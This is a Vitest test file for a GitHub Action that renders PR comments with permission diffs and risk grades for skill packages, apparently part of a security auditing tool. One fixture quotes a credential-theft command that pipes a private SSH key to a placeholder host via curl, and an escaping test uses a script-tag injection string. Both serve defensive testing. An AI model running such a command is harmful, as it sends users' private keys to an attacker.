import { describe, expect, it, vi } from "vitest";
import {
  commentMarker,
  computePermissionsDiff,
  escapeMdCell,
  renderPrComment,
  upsertPrComment,
} from "../../../scripts/action-pr-comment.mjs";

describe("GitHub Action PR Permissions Diff comment", () => {
  it("escapes untrusted Markdown and HTML characters safely", () => {
    expect(escapeMdCell("bad | <script>alert(1)</script> `[link]`\nnext")).toBe(
      "bad \\| &lt;script&gt;alert(1)&lt;/script&gt; \\`\\[link\\]\\` next",
    );
  });

  it("renders a brand-new skill report with Permissions table, findings, and README trust badge", () => {
    const md = renderPrComment({
      skillPath: "skills/weather",
      headResult: {
        skillName: "weather-helper",
        status: "complete",
        riskScore: 0,
        riskGrade: "A",
        recommendation: "approve",
        capabilities: [{ kind: "network", value: "api.open-meteo.com", file: "SKILL.md", line: 12 }],
        findings: [],
      },
    });
    expect(md).toContain(commentMarker("skills/weather"));
    expect(md).toContain("Grade A");
    expect(md).toContain("api.open-meteo.com");
    expect(md).toContain("README Trust Badge");
    expect(md).toContain("img.shields.io/badge/clawvet-A%20safe-brightgreen");
    expect(md).toContain("npm i -g clawvet && clawvet audit");
  });

  it("renders Permissions Diff between base and head on skill updates", () => {
    const baseResult = {
      skillName: "notes-sync",
      status: "complete",
      riskScore: 0,
      riskGrade: "A",
      recommendation: "approve",
      capabilities: [{ kind: "network", value: "api.notes.dev" }],
      findings: [],
    };
    const headResult = {
      skillName: "notes-sync",
      status: "complete",
      riskScore: 90,
      riskGrade: "F",
      recommendation: "block",
      capabilities: [
        { kind: "network", value: "api.notes.dev" },
        { kind: "secret", value: "~/.ssh", file: "scripts/sync.py", line: 9 },
        { kind: "network", value: "webhook.site", risky: true, file: "scripts/sync.py", line: 12 },
      ],
      findings: [
        {
          severity: "critical",
          title: "Credential read sent over the network",
          evidence: "cat ~/.ssh/id_rsa | curl <evil>",
          lineNumber: 12,
        },
      ],
      coverage: {
        files: [{ path: "scripts/sync.py", startLine: 1, endLine: 20 }],
      },
    };

    const diff = computePermissionsDiff(baseResult.capabilities, headResult.capabilities);
    expect(diff.added.length).toBe(2);
    expect(diff.removed.length).toBe(0);

    const md = renderPrComment({ skillPath: "skills/notes-sync", headResult, baseResult, baseRef: "main" });
    expect(md).toContain("Permissions Diff vs `main`");
    expect(md).toContain("Grade A (0) -> Grade F (90)** (+90)");
    expect(md).toContain("Added permissions (2)");
    expect(md).toContain("~/.ssh");
    expect(md).toContain("webhook.site` (risky)");
    expect(md).toContain("scripts/sync.py:12");
    expect(md).toContain("&lt;evil&gt;");
  });

  it("reports clean PR updates with zero permission changes", () => {
    const cap = [{ kind: "network", value: "api.github.com" }];
    const md = renderPrComment({
      skillPath: "skills/gh",
      baseRef: "main",
      baseResult: { skillName: "gh", status: "complete", riskScore: 0, riskGrade: "A", capabilities: cap, findings: [] },
      headResult: { skillName: "gh", status: "complete", riskScore: 0, riskGrade: "A", capabilities: cap, findings: [] },
    });
    expect(md).toContain("No permission changes in this PR.");
  });

  it("upserts PR comments: creates when absent, patches when marker exists", async () => {
    const marker = commentMarker("skills/demo");

    // 1. No existing comment -> POST
    const fetchCreate = vi.fn()
      .mockResolvedValueOnce({ ok: true, json: async () => [] })
      .mockResolvedValueOnce({ ok: true, json: async () => ({ id: 42 }) });
    const created = await upsertPrComment({
      token: "tok",
      repo: "owner/repo",
      prNumber: 7,
      marker,
      body: `${marker}\nhello`,
      fetchImpl: fetchCreate,
    });
    expect(created).toEqual({ action: "created", commentId: 42 });
    expect(fetchCreate).toHaveBeenCalledTimes(2);
    expect(fetchCreate.mock.calls[1][1].method).toBe("POST");

    // 2. Existing comment matches marker -> PATCH
    const fetchPatch = vi.fn()
      .mockResolvedValueOnce({ ok: true, json: async () => [{ id: 99, body: `${marker}\nold` }] })
      .mockResolvedValueOnce({ ok: true, json: async () => ({ id: 99 }) });
    const updated = await upsertPrComment({
      token: "tok",
      repo: "owner/repo",
      prNumber: 7,
      marker,
      body: `${marker}\nnew`,
      fetchImpl: fetchPatch,
    });
    expect(updated).toEqual({ action: "updated", commentId: 99 });
    expect(fetchPatch.mock.calls[1][0]).toContain("/issues/comments/99");
    expect(fetchPatch.mock.calls[1][1].method).toBe("PATCH");
  });
});
